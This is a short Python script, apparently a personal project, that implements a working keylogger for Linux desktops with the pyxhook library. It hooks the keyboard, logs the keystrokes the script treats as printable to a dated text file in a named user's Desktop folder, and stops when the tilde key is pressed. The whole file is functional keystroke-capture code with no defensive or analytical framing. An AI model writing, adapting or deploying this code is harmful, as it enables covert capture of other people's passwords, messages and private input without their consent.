# noinspection PyUnresolvedReferences
import  pyxhook
# noinspection PyUnresolvedReferences

import datetime




#----------------------Functions----------------------

def OnKeyPress(event):

    #write on the file when the button that was pressed was  not ctrl,space,..etc
    if event.Ascii > 32 and event.Ascii != 126 and event.Ascii != 16:
        file.write( event.Key)



    #if space,tab,enter is pressed then change line

    if event.Ascii == 32 or event.Ascii == 9 or event.Ascii == 13:

        file.write("\n")
        #if  ~ or Shift + ` was pressed close the keylogger
    elif event.Ascii == 126:
        file.close()
        hook.cancel()




#---------------------------------------------


#make a new file everytime the program runs on a date different than the current one.

objCurrentDate = datetime.date.today()
CurrYear = objCurrentDate.year
CurrMonth = objCurrentDate.month
CurrDay = objCurrentDate.day

#specify the file location

fob = '/home/dimpap/Desktop/keylog'+'-'+str(CurrYear)+'-'+str(CurrMonth) + '-' + str(CurrDay) + '.txt'

file = open(fob,'a')


#instantiate HookManager class

hook = pyxhook.HookManager()




#listen to key strokes when a button is pressed
hook.KeyDown = OnKeyPress

#hook the keyboard
hook.HookKeyboard()
#start the keylogger session
hook.start()

